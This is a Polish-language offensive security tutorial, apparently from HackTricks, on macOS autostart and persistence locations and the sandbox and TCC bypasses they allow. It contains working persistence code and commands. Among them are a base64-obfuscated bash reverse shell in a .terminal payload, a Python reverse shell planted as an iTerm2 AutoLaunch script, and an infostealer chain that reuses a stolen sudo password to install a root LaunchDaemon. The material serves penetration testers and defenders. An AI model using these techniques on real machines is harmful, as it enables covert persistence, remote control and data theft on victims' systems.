# Automatyczne uruchamianie macOS

{{#include ../banners/hacktricks-training.md}}

Ta sekcja jest w dużej mierze oparta na serii wpisów na blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/); jej celem jest dodanie **większej liczby lokalizacji autostartu** (jeśli to możliwe), wskazanie, **które techniki nadal działają** obecnie w najnowszej wersji macOS (13.4) oraz określenie wymaganych **uprawnień**.

## Obejście Sandbox

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **obejścia sandboxa**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **oczekiwanie** na bardzo **częstą** **akcję**, określoną **ilość czasu** lub **akcję, którą zwykle można wykonać** z wnętrza sandboxa bez uprawnień root.

### Launchd

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagany root
- **`/Library/LaunchDaemons`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagany root
- **`/System/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagany root
- **`/System/Library/LaunchDaemons`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagany root
- **`~/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne logowanie
- **`~/Library/LaunchDemons`**
- **Wyzwalacz**: Ponowne logowanie

> [!TIP]
> Ciekawostką jest to, że **`launchd`** ma wbudowaną property list w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Ponadto usługi te mogą zawierać `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą zostać uruchomione i pomyślnie zakończyć działanie.
>
> Oczywiście nie można jej zmodyfikować z powodu code signing.

#### Opis i exploitation

**`launchd`** jest **pierwszym** **procesem** wykonywanym przez jądro OX S podczas uruchamiania i ostatnim, który kończy działanie podczas zamykania systemu. Zawsze powinien mieć **PID 1**. Proces ten będzie **odczytywał i wykonywał** konfiguracje wskazane w **plikach** **ASEP** w lokalizacjach:

- `/Library/LaunchAgents`: Agenty per-user zainstalowane przez administratora
- `/Library/LaunchDaemons`: Daemony działające w całym systemie, zainstalowane przez administratora
- `/System/Library/LaunchAgents`: Agenty per-user dostarczane przez Apple.
- `/System/Library/LaunchDaemons`: Daemony działające w całym systemie, dostarczane przez Apple.

Po zalogowaniu się użytkownika pliki znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.

**Główna różnica między agentami a daemonami polega na tym, że agenty są ładowane po zalogowaniu się użytkownika, a daemony są ładowane podczas uruchamiania systemu** (ponieważ istnieją usługi, takie jak ssh, które muszą zostać wykonane przed uzyskaniem przez jakiegokolwiek użytkownika dostępu do systemu). Agenty mogą również korzystać z GUI, natomiast daemony muszą działać w tle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Istnieją przypadki, w których **agent musi zostać uruchomiony przed zalogowaniem się użytkownika** — nazywa się je **PreLoginAgents**. Jest to przydatne na przykład do zapewnienia technologii asystujących podczas logowania. Można je również znaleźć w `/Library/LaunchAgents` (zobacz [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).

> [!TIP]
> Nowe pliki konfiguracyjne Daemons lub Agents zostaną **załadowane po ponownym uruchomieniu systemu lub przy użyciu** `launchctl load <target.plist>`. **Możliwe jest również załadowanie plików .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak takie pliki plist nie zostaną automatycznie załadowane po ponownym uruchomieniu systemu).\
> Możliwe jest również ich **wyładowanie** za pomocą `launchctl unload <target.plist>` (wskazany przez ten plik proces zostanie zakończony),
>
> Aby **upewnić się**, że **nic** (na przykład nadpisanie konfiguracji) **nie uniemożliwia** uruchomienia **Agenta** lub **Daemona**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Wyświetl wszystkich agentów i daemonów załadowanych przez bieżącego użytkownika:
```bash
launchctl list
```
#### Przykładowy łańcuch złośliwego LaunchDaemon (ponowne użycie hasła)

Niedawny infostealer dla macOS ponownie wykorzystał **przechwycone hasło sudo**, aby utworzyć user agenta i root LaunchDaemon:<sup>[[1]](#references)</sup>

- Zapisz pętlę agenta w `~/.agent` i nadaj jej uprawnienia do wykonywania.
- Wygeneruj plist w `/tmp/starter`, wskazujący na tego agenta.
- Ponownie wykorzystaj skradzione hasło wraz z `sudo -S`, aby skopiować go do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić `root:wheel` i załadować za pomocą `launchctl load`.
- Uruchom agenta po cichu za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Jeśli plist jest własnością użytkownika, nawet jeśli znajduje się w systemowych folderach daemonów, **zadanie zostanie wykonane jako użytkownik**, a nie jako root. Może to uniemożliwić niektóre ataki privilege escalation.

#### Więcej informacji o launchd

**`launchd`** jest **pierwszym procesem w trybie użytkownika**, który jest uruchamiany przez **kernel**. Uruchomienie procesu musi być **pomyślne**, a proces **nie może zakończyć działania ani ulec awarii**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi proces**.

Jedną z pierwszych rzeczy, które robi `launchd`, jest **uruchomienie** wszystkich **daemonów**, takich jak:

- **Daemony timerów** uruchamiane na podstawie czasu:
- atd (`com.apple.atrun.plist`): Ma `StartInterval` ustawione na 30 min
- crond (`com.apple.systemstats.daily.plist`): Ma `StartCalendarInterval`, które uruchamia go o 00:15
- **Daemony sieciowe**, takie jak:
- `org.cups.cups-lpd`: Nasłuchuje przez TCP (`SockType: stream`) z `SockServiceName: printer`
- SockServiceName musi być portem lub usługą z `/etc/services`
- `com.apple.xscertd.plist`: Nasłuchuje przez TCP na porcie 1640
- **Daemony ścieżek**, które są uruchamiane, gdy określona ścieżka ulegnie zmianie:
- `com.apple.postfix.master`: Sprawdza ścieżkę `/etc/postfix/aliases`
- **Daemony powiadomień IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach:**
- `com.apple.xscertd-helper.plist`: Wskazuje w wpisie `MachServices` nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
- Różni się on od poprzedniego. Powoduje, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenia. Jednak w tym przypadku głównym zaangażowanym plikiem binarnym nie jest `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on plugins z folderu z ograniczeniami SIP `/System/Library/UserEventPlugins/`, gdzie każdy plugin wskazuje swój initializer w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych plugins, w słowniku `CFPluginFactories`, pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` swojego `Info.plist`.

### pliki startowe powłoki

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- Jednak trzeba znaleźć aplikację z TCC bypass, która uruchamia shell ładujący te pliki

#### Lokalizacje

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Wyzwalacz**: Otwarcie terminala z zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Wyzwalacz**: Otwarcie terminala z zsh
- Wymagany root
- **`~/.zlogout`**
- **Wyzwalacz**: Zamknięcie terminala z zsh
- **`/etc/zlogout`**
- **Wyzwalacz**: Zamknięcie terminala z zsh
- Wymagany root
- Potencjalnie więcej informacji w: **`man zsh`**
- **`~/.bashrc`**
- **Wyzwalacz**: Otwarcie terminala z bash
- `/etc/profile` (nie zadziałało)
- `~/.profile` (nie zadziałało)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Wyzwalacz**: Oczekuje się, że zostanie uruchomiony przez xterm, ale nie jest on **zainstalowany**, a nawet po instalacji pojawia się ten błąd: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i Exploitation

Podczas inicjowania środowiska shell, takiego jak `zsh` lub `bash`, uruchamiane są **określone pliki startowe**. macOS obecnie używa `/bin/zsh` jako domyślnego shella. Shell ten jest automatycznie uzyskiwany po uruchomieniu aplikacji Terminal lub po uzyskaniu dostępu do urządzenia przez SSH. Chociaż `bash` i `sh` są również dostępne w macOS, należy je jawnie wywołać, aby ich użyć.<sup>[[2]](#references)</sup>

Strona man zsh, którą można odczytać za pomocą **`man zsh`**, zawiera szczegółowy opis plików startowych.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponownie otwierane aplikacje

> [!CAUTION]
> Skonfigurowanie wskazanego mechanizmu exploitation oraz wylogowanie się i ponowne zalogowanie, a nawet ponowne uruchomienie systemu, nie spowodowało wykonania aplikacji podczas testów. Aplikacja może wymagać uruchomienia w momencie wykonywania tych czynności.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Wyzwalacz**: Ponowne uruchomienie powodujące ponowne otwarcie aplikacji

#### Opis i exploitation

Wszystkie aplikacje przeznaczone do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Aby sprawić, że zamiast nich uruchomi się Twoja aplikacja, wystarczy **dodać ją do listy**.

UUID można znaleźć, wyświetlając zawartość tego katalogu, lub za pomocą `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić aplikacje, które zostaną ponownie otwarte, możesz wykonać:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Aby **dodać aplikację do tej listy**, możesz użyć:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencje Terminala

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
- Terminal używany do uzyskania uprawnień FDA użytkownika, który go używa

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Wyzwalacz**: Otwarcie Terminala

#### Opis i wykorzystanie

W **`~/Library/Preferences`** przechowywane są preferencje użytkownika dotyczące Applications. Niektóre z tych preferencji mogą zawierać konfigurację umożliwiającą **wykonywanie innych aplikacji/skryptów**.<sup>[[5]](#references)</sup>

Na przykład Terminal może wykonywać polecenie podczas Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Jeśli więc plist preferencji terminala w systemie można nadpisać, funkcjonalność **`open`** może zostać użyta do **otwarcia terminala, a polecenie zostanie wykonane**.

Możesz dodać to z poziomu CLI za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Skrypty Terminala / Inne rozszerzenia plików

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- Użycie Terminala w celu uzyskania uprawnień FDA użytkownika

#### Lokalizacja

- **Wszędzie**
- **Wyzwalacz**: Otwarcie Terminala

#### Opis i eksploatacja

Jeśli utworzysz [**skrypt `.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, **aplikacja Terminal** zostanie automatycznie uruchomiona w celu wykonania wskazanych w nim poleceń. Jeśli aplikacja Terminal ma specjalne uprawnienia (takie jak TCC), Twoje polecenie zostanie uruchomione z tymi specjalnymi uprawnieniami.

Wypróbuj to za pomocą:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Możesz także użyć rozszerzeń **`.command`**, **`.tool`**, zawierających zwykły kod shell scripts; one również zostaną otwarte przez Terminal.

> [!CAUTION]
> Jeśli Terminal ma **Full Disk Access**, będzie w stanie wykonać tę akcję (pamiętaj, że wykonane polecenie będzie widoczne w oknie Terminala).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- **`/Library/Audio/Plug-Ins/HAL`**
- Wymagany Root
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`/Library/Audio/Plug-ins/Components`**
- Wymagany Root
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`~/Library/Audio/Plug-ins/Components`**
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer
- **`/System/Library/Components`**
- Wymagany Root
- **Wyzwalacz**: Uruchom ponownie coreaudiod lub komputer

#### Opis

Zgodnie z wcześniejszymi writeupami możliwe jest **skompilowanie niektórych audio plugins** i doprowadzenie do ich załadowania.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i Exploitation

QuickLook plugins mogą zostać uruchomione po **wywołaniu podglądu pliku** (naciśnięciu spacji, gdy plik jest zaznaczony w Finderze), jeśli zainstalowano **plugin obsługujący dany typ pliku**.<sup>[[8]](#references)</sup>

Możliwe jest skompilowanie własnego QuickLook plugin, umieszczenie go w jednej z wcześniejszych lokalizacji w celu jego załadowania, a następnie przejście do obsługiwanego pliku i naciśnięcie spacji, aby go uruchomić.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> U mnie to nie zadziałało — ani z użytkownikiem LoginHook, ani z root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz mieć możliwość wykonania czegoś takiego jak `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Znajduje się w `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale można ich używać do wykonywania poleceń, gdy użytkownik się loguje.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Aby go usunąć:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Element dotyczący użytkownika root jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś poprzez **zapisanie tego do pliku** i **oczekiwanie na niezbyt typowe warunki**, takie jak zainstalowane określone **programy, „nietypowe” działania użytkownika** lub środowiska.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Przydatne do bypassu sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Jednak musisz mieć możliwość wykonania pliku binarnego `crontab`
- Lub być użytkownikiem root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Do bezpośredniego zapisu wymagany jest root. Root nie jest wymagany, jeśli możesz wykonać `crontab <file>`
- **Wyzwalacz**: Zależy od zadania cron

#### Opis i Exploitation

Wyświetl zadania cron **bieżącego użytkownika** za pomocą:
```bash
crontab -l
```
Możesz również zobaczyć wszystkie zadania cron użytkowników w **`/usr/lib/cron/tabs/`** oraz **`/var/at/tabs/`** (wymaga uprawnień root).

W systemie MacOS można znaleźć kilka folderów wykonujących skrypty z **określoną częstotliwością** w:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Można tam znaleźć regularne **zadania** **cron**, **zadania** **at** (nieużywane zbyt często) oraz **zadania** **periodic** (używane głównie do czyszczenia plików tymczasowych). Codzienne zadania periodic można uruchomić na przykład za pomocą: `periodic daily`.<sup>[[10]](#references)</sup>

Aby programowo dodać **zadanie cron użytkownika**, można użyć:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Opis: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 miał wcześniej przyznane uprawnienia TCC

#### Lokalizacje

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Wyzwalacz**: Otwarcie iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Wyzwalacz**: Otwarcie iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Wyzwalacz**: Otwarcie iTerm

#### Opis i Exploitation

Skrypty przechowywane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zostaną wykonane. Na przykład:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
lub:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** również zostanie uruchomiony:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Preferencje iTerm2 znajdujące się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą **wskazywać polecenie do wykonania** po otwarciu terminala iTerm2.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Polecenie jest odzwierciedlone w preferencjach:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Polecenie do wykonania można ustawić za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Jest bardzo prawdopodobne, że istnieją **inne sposoby nadużywania preferencji iTerm2** w celu wykonywania dowolnych poleceń.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak xbar musi być zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- Żąda uprawnień Ułatwień dostępu

#### Lokalizacja

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Wyzwalacz**: Po uruchomieniu xbar

#### Opis

Jeśli zainstalowany jest popularny program [**xbar**](https://github.com/matryer/xbar), możliwe jest zapisanie skryptu powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Opracowanie**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Hammerspoon musi być jednak zainstalowany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień Accessibility

#### Lokalizacja

- **`~/.hammerspoon/init.lua`**
- **Wyzwalacz**: Po uruchomieniu hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) służy jako platforma automatyzacji dla **macOS**, wykorzystująca do działania **język skryptowy LUA**. Obsługuje również integrację kompletnego kodu AppleScript oraz wykonywanie shell scripts, co znacznie zwiększa jej możliwości skryptowe.<sup>[[13]](#references)</sup>

Aplikacja wyszukuje pojedynczy plik `~/.hammerspoon/init.lua`, a po uruchomieniu skrypt zostanie wykonany.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak BetterTouchTool musi być zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- Żąda uprawnień Automation-Shortcuts i Accessibility

#### Lokalizacja

- `~/Library/Application Support/BetterTouchTool/*`

To narzędzie umożliwia wskazanie aplikacji lub skryptów do uruchomienia po naciśnięciu określonych skrótów. Atakujący może być w stanie skonfigurować w bazie danych własny **skrót i akcję do wykonania**, aby uruchomić dowolny kod (skrót może polegać tylko na naciśnięciu klawisza).

### Alfred

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak Alfred musi być zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- Żąda uprawnień Automation, Accessibility, a nawet Full-Disk access

#### Lokalizacja

- `???`

Umożliwia tworzenie workflows, które mogą wykonywać kod po spełnieniu określonych warunków. Potencjalnie atakujący może utworzyć plik workflow i sprawić, aby Alfred go załadował (do korzystania z workflows wymagane jest opłacenie wersji premium).

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak ssh musi być włączone i używane
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
- SSH zapewnia dostęp FDA

#### Lokalizacja

- **`~/.ssh/rc`**
- **Wyzwalacz**: Logowanie przez ssh
- **`/etc/ssh/sshrc`**
- Wymagany root
- **Wyzwalacz**: Logowanie przez ssh

> [!CAUTION]
> Włączenie ssh wymaga Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i exploitation

Domyślnie, o ile w `/etc/ssh/sshd_config` nie ustawiono `PermitUserRC no`, gdy użytkownik **loguje się przez SSH**, wykonywane są skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementy logowania**

Opis: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak należy wykonać `osascript` z argumentami
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Wyzwalacz:** Logowanie
- Payload exploit zapisany z wywołaniem **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Wyzwalacz:** Logowanie
- Wymagany root

#### Opis

W Preferencjach systemowych -> Użytkownicy i grupy -> **Elementy logowania** można znaleźć **elementy wykonywane podczas logowania użytkownika**.\
Możliwe jest ich wyświetlanie, dodawanie i usuwanie z wiersza poleceń:<sup>[[15]](#references)</sup>
